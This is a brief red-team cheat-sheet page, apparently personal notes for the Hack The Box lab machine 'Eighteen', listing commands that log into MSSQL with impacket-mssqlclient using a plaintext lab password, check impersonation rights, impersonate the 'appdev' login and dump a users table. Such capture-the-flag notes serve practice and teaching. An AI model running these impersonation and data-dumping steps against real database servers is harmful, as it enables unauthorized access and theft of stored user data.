---
title: XP-cmdShell
parent: Attack Repository
grand_parent: Red Team
nav_order: 255
---

# HTB_Eighteen
## Login
```zsh
impacket-mssqlclient kevin:‘iNa2we6haRj2gaw!’@eighteen.htb
```

## Check Permissions
```zsh
enum_impersonate
```

## Switch Users
```zsh
execute as login = ‘appdev’
```

## List Databases
```zsh
select name from sys.databases;
```

## Use a Database
```zsh
use financial_planner;
```

## List Tables
```zsh
select * from financial_planner.INFORMATION_SCHEMA.TABLES;
```

## Check Data
```zsh
select * from users;
```